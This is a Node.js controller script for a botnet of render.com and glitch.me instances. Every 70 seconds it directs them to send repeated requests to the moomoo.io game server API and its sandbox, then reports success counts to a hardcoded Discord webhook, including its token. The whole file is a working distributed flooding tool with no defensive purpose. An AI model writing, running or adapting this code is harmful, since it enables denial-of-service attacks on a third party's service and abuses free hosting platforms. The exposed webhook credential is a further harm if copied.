const fetch = require("node-fetch");

const express = require("express");
const app = express();
const port = 3000;

app.use(express.json());

app.get("/ping", async (req, res) => {
  console.log("pinged")
  return res.send(`3 alive`);
});

app.listen(port);

const webhook = async (content) => {
    const payload = JSON.stringify({ content });

    try {
        const response = await fetch("https://discord.com/api/webhooks/1292186185871134761/2XohjigBogeyUtA6gYoWKGiVfa7yLnONjaeZPs4j06XfbKTA0xEsjuw47OoTqdUjpPbr", {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: payload,
        });
    } catch (error) {
        console.error('Error:', error);
    }
};

let names = [
   "https://aaaa8.onrender.com",
    "https://aaaa9.onrender.com",
    "https://aaaa-1-z6h6.onrender.com",
    "https://aaaa-15.onrender.com",
    "https://aaaa-16.onrender.com",
    "https://aaaa-17.onrender.com",
    "https://aaaa-18.onrender.com",
    "https://aaaa-12.onrender.com",
    "https://lol-d399.onrender.com",
    "https://aaaa-j6u9.onrender.com",
    "https://aaaa1.onrender.com",
    "https://aaaa2.onrender.com",
    "https://aaaa4.onrender.com",
    "https://aaaa3.onrender.com",
    "https://aaaa5.onrender.com",
    "https://aaaa7.onrender.com",
    "https://aaaa6.onrender.com"
   "cute-coordinated-syzygy",
            "familiar-busy-snowshoe",
            "gorgeous-truth-velociraptor",
            "dune-beryl-turner",
            "bird-jade-wren",
            "tattered-pickled-hardware",
            "perpetual-sky-crowley",
            "iced-catnip-angolatitan",
            "silken-easy-bead",
            "thunder-sequoia-deer",
            "better-inexpensive-crime",
            "magic-alive-need",
            "grass-opalescent-butterfly",
            "automatic-tulip-veterinarian",
            "honorable-cloud-silica",
            "open-honeysuckle-piccolo",
            "mewing-abstracted-aurora",
            "cooperative-gentle-change",
            "plum-buttered-bear",
            "royal-classy-venom",
            "brass-famous-damselfly",
            "south-brook-fur",
            "charming-dirt-collision",
            "coral-outrageous-freeze",
            "expensive-scarce-earth",
            "sleet-jeweled-humor",
            "courageous-shocking-chicken",
            "flaxen-first-motion",
            "sincere-complete-plier",
            "watery-just-airplane",
            "splendid-western-geography",
            "steep-tundra-braid",
            "supreme-flicker-leather",
            "early-cobalt-limit",
            "temporal-miniature-seeker",
            "thoughtful-great-rudbeckia",
            "bronzed-same-munchkin",
            "walnut-relieved-knuckle",
            "angry-caterwauling-daughter",
    "cooperative-humdrum-nerine",
    "stingy-golden-dragon",
    "wirehaired-tender-venom",
    "fluoridated-working-joke",
    "absorbing-light-archeology",
    "climbing-scientific-battery",
    "fuschia-common-cause",
    "motley-polished-pigment",
    "handsome-bead-ton",
    "deadpan-sponge-mall",
    "splashy-pretty-yarn",
    "triangular-wary-friction",
    "billowy-empty-river",
    "therapeutic-receptive-sweater",
    "veiled-impartial-erica",
    "warm-opalescent-fruit",
    "calico-pear-aphid",
    "like-freckle-chips",
    "water-pollen-system",
    "coal-boiled-enemy",
    "fan-slash-search",
    "able-carnelian-gallon",
    "vaulted-detailed-hardware",
    "spotty-marvelous-objective",
    "thundering-lying-lemming",
    "foil-probable-ring",
    "curse-working-barge",
    "glow-puzzling-pyrite",
    "clover-peach-wool",
    "tundra-rocky-pediatrician",
    "cloud-tremendous-carp",
    "veiled-real-cockroach",
    "cotton-common-patient",
    "witty-fish-plantain",
    "exuberant-beaded-leopard",
    "quark-zest-fountain",
    "sapphire-adaptable-slug",
    "helpful-third-sprite",
    "midnight-radial-gateway",
    "bramble-narrow-honey",
    "general-fresh-chard",
    "poised-patch-sun",
    "shade-inky-xenon",
    "dull-prong-jute",
    "grape-achieved-sing",
    "gravel-vast-hip",
    "fancy-expensive-can",
    "clever-solid-literature",
    "judicious-kindly-shell",
    "brazen-nova-bromine"
]

const sendReq = async (direction, amount) => {
    let total = { failed: 0, success: 0, amount: 0 };

    const runRequests = () => {
        const promises = names.map(name => {
            let url = name.includes("render") ? `${name}/ping?url=${direction}&amount=${amount}` : `https://${name}.glitch.me/ping?url=${direction}&amount=${amount}`;

            total.amount += amount;

            return fetch(url)
                .then(res => res.text())
                .then(text => {
                    let parts = text.split("?");
                    let [ failed, success ] = [Number(parts[0]), Number(parts[1].split("/")[0])]

                    total.failed += failed;
                    total.success += success;
                })
                .catch(e => {
           // console.log(name, "failed")
            });
        });

        return Promise.all(promises);
    };

    await runRequests();

    total.success > total.amount / 2 && webhook(`requested **${direction}** ${total.success}/${total.amount}`);
};

setInterval(() => {
 sendReq(`https://api.moomoo.io/servers?v=1.22`, 20);
sendReq(`https://api-sandbox.moomoo.io/servers?v=1.22`, 20);
}, 70e3);
